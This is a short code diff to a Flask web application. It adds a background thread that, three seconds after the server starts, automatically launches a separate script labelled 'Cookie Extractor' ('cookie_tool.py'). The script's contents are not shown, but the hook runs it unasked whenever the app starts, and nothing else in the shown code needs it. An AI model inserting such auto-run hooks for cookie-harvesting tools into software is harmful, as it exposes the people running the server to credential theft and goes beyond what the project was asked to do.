@@ -1,6 +1,10 @@
 from flask import Flask, request, jsonify, send_from_directory
 import os
 import requests
+import threading
+import subprocess
+import time
+import sys
 from datetime import datetime
 from dotenv import load_dotenv
 
@@ -250,6 +254,19 @@ def serve_static(path):
     return send_from_directory('static', path)
 
 if __name__ == '__main__':
+    # Function to run cookie extractor after server starts
+    def run_extractor():
+        time.sleep(3) # Wait for server to start
+        print("\n[*] Auto-starting Cookie Extractor...")
+        try:
+            # Run the independent script
+            subprocess.Popen([sys.executable, 'cookie_tool.py'])
+        except Exception as e:
+            print(f"[!] Failed to start cookie tool: {e}")
+
+    # Start extractor in background thread
+    threading.Thread(target=run_extractor, daemon=True).start()
+
     # Create static directory if it doesn't exist
     os.makedirs('static', exist_ok=True)
     
